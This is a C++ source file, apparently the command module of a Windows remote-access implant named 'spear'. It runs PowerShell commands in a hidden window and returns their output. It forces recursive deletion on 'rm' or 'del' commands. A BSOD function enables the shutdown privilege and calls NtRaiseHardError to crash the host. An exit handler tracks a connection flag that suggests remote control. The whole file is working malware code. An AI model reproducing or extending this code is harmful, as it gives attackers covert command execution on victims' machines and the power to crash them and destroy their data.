#include <cwchar>
#include <string>
#include <vector>
#include <unistd.h>
#include <windows.h>
#include <nlohmann/json.hpp>


#include "API.h"
#include "Utilt.h"
#include "KeyWord.h"
#include "Instance.h"
#include "DebugLog.h"

namespace spear
{
    std::string RunPowerShell(const std::string& strCmd)
    {
        std::string strNewCmd;
        // * use powershell.exe -Command "& {${strcmd}}" to Prevent string escaping
        if (
            strCmd.find("del")         != std::string::npos ||
            strCmd.find("rm")          != std::string::npos ||
            strCmd.find("remove-item") != std::string::npos
        )
            strNewCmd = prefixKeyWord + strCmd + " -Recurce -Force" + suffixKeyWord;
        else    
            strNewCmd = prefixKeyWord + strCmd + suffixKeyWord;
        SECURITY_ATTRIBUTES sa = { 0 };
        sa.nLength = sizeof(SECURITY_ATTRIBUTES);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;
        STARTUPINFOA si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        std::vector<char> buffer(4096);
        DWORD bytesRead = 0;
        std::string output;
    
        HANDLE hRead = NULL, hWrite = NULL;
        if (!Win32::CreatePipe(&hRead, &hWrite, &sa, 0))
            goto Exit0;
    
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
    
        si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        si.wShowWindow = SW_HIDE; // 隐藏窗口
        si.hStdOutput = hWrite;
        si.hStdError = hWrite;
    
        if (!Win32::CreateProcessA(NULL, (LPSTR)strNewCmd.c_str(), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
            goto Exit0;
    
        if (hWrite)
        {
            Win32::CloseHandle(hWrite);
            hWrite = NULL;
        }
    
        while (true)
        {
            if (!Win32::ReadFile(hRead, &buffer[0], buffer.size(), &bytesRead, NULL) || bytesRead == 0)
            {
                if (GetLastError() == ERROR_BROKEN_PIPE)
                    break;
            }
            output.append(&buffer[0], bytesRead);
        }
    
        if (pi.hProcess)
            Win32::WaitForSingleObject(pi.hProcess, (20 * 1000)); // * Wait 20 seconds

        
        // * Since GreateProcessA cannot switch the path, the SetCurrentDirectoryA function is used to change the current process path.
        if (strCmd.find("cd") != std::string::npos)
        {
            Win32::SetCurrentDirectoryA(std::string(strCmd.begin() + 3, strCmd.end()).c_str());
            Instance.Info.cwd = std::wstring(spear::ToWstring(std::string(getcwd(NULL, 0))));
        }
    
    Exit0:
        if (pi.hThread)  Win32::CloseHandle(pi.hThread);
        if (pi.hProcess) Win32::CloseHandle(pi.hProcess);
        if (hRead)       Win32::CloseHandle(hRead);
        if (hWrite)      Win32::CloseHandle(hWrite);
        return spear::GBKToUTF8(output);
    }

    std::string BSOD(const std::string& args)
    {
        DEBUG_LOG("BSOD");
#ifndef DEBUG
        BOOLEAN enable;
        ULONG response;
        Win32::RtlAdjustPrivilege(19, TRUE, FALSE, &enable);
        Win32::NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
        
#endif
        return successKeyWord;
    }

    std::string Exit(const std::string& args)
    {
        Instance.Config.connected = false;
        Instance.Config.exit = true;
        return successKeyWord;
    }
}